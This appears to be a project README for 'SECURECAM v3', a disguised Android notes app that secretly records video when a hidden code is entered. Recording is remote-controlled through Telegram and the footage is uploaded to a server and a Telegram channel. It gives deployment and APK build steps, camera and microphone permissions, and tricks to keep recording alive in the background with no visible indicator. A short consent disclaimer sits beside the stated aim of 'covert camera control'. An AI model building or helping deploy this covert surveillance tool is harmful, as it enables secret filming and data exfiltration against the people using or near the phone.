# 🎥 SECURECAM v3 - Hidden Camera Notes App

A professional notes app with hidden camera functionality. Looks like a normal notes app but can secretly record video and upload to Telegram.

## ✨ Features

- 📱 **Notes App UI** - Looks like a normal notes app
- 🎥 **Hidden Camera** - Activates silently via secret code
- 🔒 **Secret Activation** - Type "243" in search bar to activate
- 📡 **Telegram Control** - `/on` and `/off` commands
- ⚡ **Fast Response** - 1 second command polling
- 🎬 **MP4 Upload** - Direct MP4 recording with live progress
- 🔋 **Background Recording** - Silent audio keeps app alive
- 📊 **Live Progress** - See conversion progress in Telegram bot

## 🚀 Quick Start

### 1. Deploy Bot Server

#### Option A: Koyeb (Recommended)
1. Push this folder to GitHub
2. Connect to Koyeb
3. Set environment variables:
   ```
   BOT_TOKEN=your_telegram_bot_token
   CHANNEL_ID=your_channel_id
   PORT=8080
   ```
4. Deploy!

#### Option B: Local Testing
```bash
pip install -r requirements.txt
export BOT_TOKEN=your_token
export CHANNEL_ID=your_channel
export PORT=8080
python server.py
```

### 2. Build App

```bash
# Update server URL in www/app.js
# Line 12: const SERVER_URL = 'https://your-server.koyeb.app';

# Install Capacitor
npm install @capacitor/core @capacitor/cli

# Initialize
npx cap init "My Notes" com.mynotes.app --web-dir=www

# Add Android platform
npx cap add android

# Sync web files
npx cap sync android

# Build APK
cd android
./gradlew assembleDebug

# APK location:
# android/app/build/outputs/apk/debug/app-debug.apk
```

### 3. Use the App

1. Install APK on phone
2. Open app → Looks like normal notes app
3. **Secret Activation:**
   - Tap 🔍 search button
   - Type **"243"**
   - Camera activates silently
4. **Telegram Commands:**
   - `/on` → Start recording
   - `/off` → Stop + upload MP4

## 📡 Telegram Bot Commands

| Command | Action |
|---------|--------|
| `/start` | Show help message |
| `/on` | Camera ON + Start recording |
| `/off` | Stop recording + Upload MP4 |

## 📊 How It Works

### Command Flow:
```
1. User sends /on in Telegram
2. Bot stores command in memory
3. App polls /api/cmd/get every 1 second
4. App receives "start" command
5. Camera activates + recording starts
6. User sends /off
7. App stops recording
8. App uploads video to /api/video/upload
9. Server converts to MP4 (if needed)
10. Server uploads to Telegram channel
11. Bot shows live progress updates
```

### Background Keep-Alive:
- Silent audio loop plays (volume 0.01)
- WakeLock keeps screen active
- App stays alive in background

## 🔧 Configuration

### Server (server.py)
```python
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
PORT = int(os.environ.get("PORT", "8080"))
```

### App (www/app.js)
```javascript
const SERVER_URL = 'https://your-server.koyeb.app';
const SECRET_PIN = '243';  // Change if needed
const POLL_INTERVAL = 1000; // 1 second
```

## 📱 Android Permissions

Add to `android/app/src/main/AndroidManifest.xml`:

```xml
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
```

## 🔋 Battery Optimization

To keep app alive in background:

1. **Disable Battery Optimization:**
   - Settings → Apps → My Notes → Battery → Unrestricted

2. **Allow Background Activity:**
   - Settings → Apps → My Notes → Mobile data & Wi-Fi → Background data ✓

3. **Lock in Recent Apps:**
   - Open recent apps
   - Long press My Notes app
   - Tap "Lock" or pin icon

## 🐛 Troubleshooting

### Camera not activating?
- Check camera permission granted
- Make sure no other app is using camera
- Check server URL is correct in app.js

### Recording not starting?
- Camera must be active first (type 243 in search)
- Check microphone permission granted

### Upload failing?
- Check internet connection
- Verify server is running
- Check bot token and channel ID

### Background recording stops?
- Disable battery optimization for app
- Lock app in recent apps
- Keep screen on (wake lock)

## ⚠️ Important Notes

### Legal & Ethical:
- ⚠️ Only use on YOUR OWN devices
- ⚠️ Do NOT record without consent
- ⚠️ Follow local laws and regulations
- ⚠️ Author not responsible for misuse

### Technical Limitations:
- ⚠️ Background recording: 70-80% reliable (device dependent)
- ⚠️ Android may kill background apps aggressively
- ⚠️ Screen off may stop recording on some devices
- ⚠️ Battery drain is high (camera always on)

### For True Background:
For 100% reliable background recording:
- Write native Android service (Java/Kotlin)
- Or use Capacitor background camera plugin
- Web-only solution has limitations

## 📊 Performance

| Metric | Value |
|--------|-------|
| Command Response | 1 second |
| Recording Format | Direct MP4 (if supported) |
| Upload Speed | Internet dependent |
| Background Reliability | 70-80% |
| Battery Drain | High |

## 🔐 Security

- No data stored locally (all uploaded)
- Secret PIN required for activation
- No visible indicators during recording
- No logs in app UI

## 📝 Changelog

### v3.0 (Current)
- ✨ Notes app UI (professional look)
- ✨ Secret code activation (243)
- ✨ Background camera with keep-alive
- ✨ Telegram control (/on /off)
- ✨ Direct MP4 recording
- ✨ Live progress in bot
- ✨ Clean, bug-free code

### v2.0
- Basic camera control
- Username-based commands
- WebM recording + conversion

### v1.0
- Calculator interface
- Multiple commands
- Slow performance

## 🆘 Support

For issues:
1. Check browser console (Chrome DevTools)
2. Check Koyeb logs
3. Verify bot token
4. Double-check server URL

## 📄 License

MIT License - Use at your own risk

## ⚡ Credits

Built with:
- Flask (Python)
- Capacitor (Android)
- FFmpeg (Video conversion)
- Telegram Bot API

---

**Made with ❤️ for covert camera control**

**Remember: Use responsibly and ethically!** 🙏
